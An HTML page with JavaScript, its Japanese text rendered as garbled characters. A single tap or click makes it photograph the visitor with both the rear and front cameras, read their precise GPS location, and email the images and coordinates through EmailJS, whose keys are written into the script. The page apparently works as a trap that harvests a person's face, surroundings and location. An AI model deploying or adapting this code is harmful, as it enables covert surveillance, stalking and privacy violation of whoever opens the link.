<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>ğŸ“· ã‚¿ãƒƒãƒã‚­ãƒ£ãƒ—ãƒãƒ£ï¼†é€ä¿¡</title>
  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      text-align: center;
    }
    img, video {
      max-width: 100%;
      border-radius: 8px;
      margin: 10px 0;
    }
    .status {
      padding: 10px;
      border-radius: 5px;
      margin: 10px 0;
      background: rgba(0,0,0,0.3);
    }
    .error { background: rgba(255,0,0,0.3); }
    .success { background: rgba(0,255,0,0.2); }
    .warning { background: rgba(255,255,0,0.2); }
  </style>
</head>
<body>
  <h1>ğŸ“· ã‚¿ãƒƒãƒã§æ’®å½±ï¼†é€ä¿¡</h1>
  <p>ã‚¯ãƒªãƒƒã‚¯ã¾ãŸã¯ã‚¿ãƒƒãƒã§å‡¦ç†é–‹å§‹</p>
  <div class="status" id="status">å¾…æ©Ÿä¸­...</div>

  <video id="video" autoplay muted playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="rear" style="display:none;">
  <img id="front" style="display:none;">
  <video id="playback" controls style="display:none;"></video>

  <script>
    emailjs.init("cPjKBUm_i6HebDQF7");

    const statusEl = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const imgRear = document.getElementById("rear");
    const imgFront = document.getElementById("front");
    const playback = document.getElementById("playback");

    const sampleVideo = "data:video/mp4;base64,AAAAIGZ0eXB...ï¼ˆç•¥ï¼‰"; // é©åˆ‡ãªBase64å‹•ç”»ãƒ‡ãƒ¼ã‚¿ã«å·®ã—æ›¿ãˆ

    function updateStatus(msg, cls = "") {
      statusEl.textContent = msg;
      statusEl.className = `status ${cls}`;
    }

    async function capturePhoto(facing) {
      updateStatus(`ğŸ“¸ ${facing}ã‚«ãƒ¡èµ·å‹•ä¸­...`, "warning");
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing }, audio: false
      });
      video.srcObject = stream;
      await new Promise(r => setTimeout(r, 1500));
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      const base64 = canvas.toDataURL("image/jpeg", 0.6);
      stream.getTracks().forEach(t => t.stop());
      return base64;
    }

    function getLocation() {
      updateStatus("ğŸ“ ä½ç½®æƒ…å ±å–å¾—ä¸­...", "warning");
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            acc: pos.coords.accuracy,
            time: new Date().toISOString()
          });
        }, err => {
          reject(new Error("ä½ç½®æƒ…å ±ã‚¨ãƒ©ãƒ¼: " + err.message));
        }, { enableHighAccuracy: true, timeout: 10000 });
      });
    }

    async function sendEmail({rear, front, location, videoStatus}) {
      updateStatus("ğŸ“¨ ãƒ¡ãƒ¼ãƒ«é€ä¿¡ä¸­...", "warning");
      try {
        await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
          photo_rear: rear,
          photo_front: front,
          location_info: `ç·¯åº¦: ${location.lat}<br>çµŒåº¦: ${location.lng}<br>ç²¾åº¦: ${location.acc}m<br>æ™‚åˆ»: ${location.time}`,
          video_status: videoStatus,
          date: new Date().toLocaleString()
        });
        updateStatus("âœ… ãƒ¡ãƒ¼ãƒ«é€ä¿¡æˆåŠŸ", "success");
      } catch (e) {
        console.error("EmailJSé€ä¿¡ã‚¨ãƒ©ãƒ¼:", e);
        updateStatus("âŒ ãƒ¡ãƒ¼ãƒ«é€ä¿¡å¤±æ•—", "error");
      }
    }

    async function execute() {
      try {
        updateStatus("ğŸ”„ å‡¦ç†ä¸­...", "warning");
        const rear = await capturePhoto("environment");
        imgRear.src = rear;
        imgRear.style.display = "block";

        const front = await capturePhoto("user");
        imgFront.src = front;
        imgFront.style.display = "block";

        const location = await getLocation();

        let videoStatus = "å‹•ç”»å†ç”Ÿç„¡ã—";
        try {
          playback.src = sampleVideo;
          await playback.play();
          playback.style.display = "block";
          videoStatus = "å‹•ç”»å†ç”Ÿå®Œäº†";
        } catch (e) {
          console.warn("å‹•ç”»å†ç”Ÿå¤±æ•—:", e);
        }

        await sendEmail({ rear, front, location, videoStatus });
        updateStatus("ğŸ‰ å…¨å‡¦ç†å®Œäº†", "success");
      } catch (e) {
        console.error("ã‚¨ãƒ©ãƒ¼:", e);
        updateStatus("âŒ ã‚¨ãƒ©ãƒ¼: " + e.message, "error");
      }
    }

    document.body.addEventListener("click", () => execute());
    document.body.addEventListener("touchstart", e => {
      e.preventDefault();
      execute();
    }, { passive: false });
  </script>
</body>
</html>
